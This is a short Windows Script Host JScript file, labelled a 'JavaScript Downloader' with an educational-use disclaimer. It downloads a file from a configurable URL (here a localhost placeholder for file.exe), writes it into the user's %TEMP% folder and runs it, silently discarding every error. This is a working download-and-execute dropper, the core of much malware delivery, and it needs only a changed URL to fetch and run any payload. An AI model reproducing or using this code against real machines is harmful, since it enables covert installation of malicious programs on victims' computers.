// Author     : Pig2333
// Name      : JavaScript Downloader (http[s]://gitee[.]com/xiaozhu2007/JS-Downloader)
// This script is distributed for educational purposes only.此脚本仅供学习使用
try {
    var WshShell = WScript.CreateObject("WScript.Shell");
    var filepath = WshShell.ExpandEnvironmentStrings("%TEMP%") + "/fuck.js";
    var url = "http://127.0.0.1/file.exe"
    var xhr = new ActiveXObject("MSXML2.XMLHTTP")
    xhr.open("GET", url, false)
    xhr.send()

    var fso = new ActiveXObject("Scripting.FileSystemObject")
    if (fso.FileExists(filepath) == false) {
        var stream = new ActiveXObject("ADODB.Stream")
        stream.Open()
        stream.Type = 1
        stream.Write(xhr.ResponseBody)
        stream.Position = 0
        stream.SaveToFile(filepath, 2)
        stream.Close()
    }

    var shell = WScript.CreateObject("WScript.Shell")
    shell.Run(filepath)
} catch (e) {/* eat any errors */ }